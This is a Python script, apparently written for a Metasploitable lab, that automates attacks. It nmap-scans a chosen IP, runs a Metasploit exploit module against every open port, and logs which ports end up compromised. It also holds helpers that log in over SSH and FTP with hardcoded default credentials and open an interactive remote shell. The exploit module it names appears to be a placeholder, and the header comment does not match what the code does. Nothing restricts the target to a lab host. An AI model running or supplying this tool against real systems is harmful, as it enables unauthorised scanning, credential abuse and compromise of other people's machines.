# Create a Metasploit Script that takes input from vulnerability scanner (nmap_remote_meta.py) that runs the exploit selected on target, and outputs compromised status into textfile
import paramiko
from ftplib import FTP
import sys
import nmap
import re
import subprocess

# Replace these with your actual credentials
SSH_USERNAME = 'msfadmin'
SSH_PASSWORD = 'msfadmin'
FTP_USERNAME = 'msfadmin'
FTP_PASSWORD = 'msfadmin'

def ssh_connect(metasploitable_ip, port):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        client.connect(metasploitable_ip, username=SSH_USERNAME, password=SSH_PASSWORD, port=port)
        print(f"Successfully connected to {metasploitable_ip} via SSH on port {port}.")

        shell = client.invoke_shell()
        while True:
            command = input("Enter command to execute on Metasploitable (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            shell.send(command + '\n')
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output)

        client.close()
    except Exception as e:
        print(f"SSH Connection failed: {e}")
    
def ftp_connect(metasploitable_ip, port):
    try:
        ftp = FTP()
        ftp.connect(metasploitable_ip, port)
        ftp.login(user=FTP_USERNAME, passwd=FTP_PASSWORD)
        print(f"Successfully connected to {metasploitable_ip} via FTP on port {port}.")

        print("Files in the current directory:")
        ftp.retrlines('LIST')

        ftp.quit()
    except Exception as e:
        print(f"FTP Connection failed: {e}")

def nmap_scan(ip_address, port_range):
    nm = nmap.PortScanner()
    port_min, port_max = map(int, port_range.split('-'))

    print(f"Scanning ports {port_min} to {port_max} on {ip_address}")
    open_ports = []
    for port in range(port_min, port_max + 1):
        try:
            result = nm.scan(ip_address, str(port))
            port_status = result['scan'][ip_address]['tcp'][port]['state']
            print(f"Port {port}: {port_status}")
            if port_status == 'open':
                open_ports.append(port)
        except:
            print(f"Cannot scan port {port}")
    return open_ports



def attack(host, port):
    """
    Runs a Metasploit module against the target host and port.
    This example uses a generic TCP exploit; you'll likely want to
    customize this based on the specific service and version.
    """
    try:
        # Construct the Metasploit command (I used a generic TCP exploit as an example)
        msf_command = f"msfconsole -x 'use exploit/generic/tcp; set RHOSTS {host}; set RPORT {port}; exploit; sessions -l; exit -y'"
        # Execute the Metasploit command
        process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        output = stdout.decode()
        error = stderr.decode()
        # Print the output and error messages
        print("Metasploit Output:")
        print(output)
        print("Metasploit Errors:")
        print(error)
        # Check if the output contains a specific string indicating a successful attack
        compromised = False
        if "Session 1 created" in output: #Check if a session was created. *CHANGE AS NEEDED*
            compromised = True
        return compromised

    except FileNotFoundError:
        print("Metasploit not found. Make sure it's in your PATH.")
        return False
    except Exception as e:
        print(f"Error during Metasploit attack: {e}")
        return False
    
def main():
    metasploitable_ip = input("Enter the IP address of the target machine: ")

    port_range = input("Enter the port range to scan (e.g., 20-100): ")
    open_ports = nmap_scan(metasploitable_ip, port_range)

    with open("status.txt", "w") as f:
        if open_ports:
            for port in open_ports:
                print(f"Attempting attack on {metasploitable_ip}:{port}")
                compromised = attack(metasploitable_ip, port)
                if compromised:
                    f.write(f"Host: {metasploitable_ip}, Port: {port}, Status: Compromised\n")
                    print(f"Host: {metasploitable_ip}, Port: {port}, Status: Compromised")
                else:
                    f.write(f"Host: {metasploitable_ip}, Port: {port}, Status: Not Compromised\n")
                    print(f"Host: {metasploitable_ip}, Port: {port}, Status: Not Compromised")
        else:
            f.write("No open ports found.\n")
            print("No open ports found.")

if __name__ == "__main__":
    main()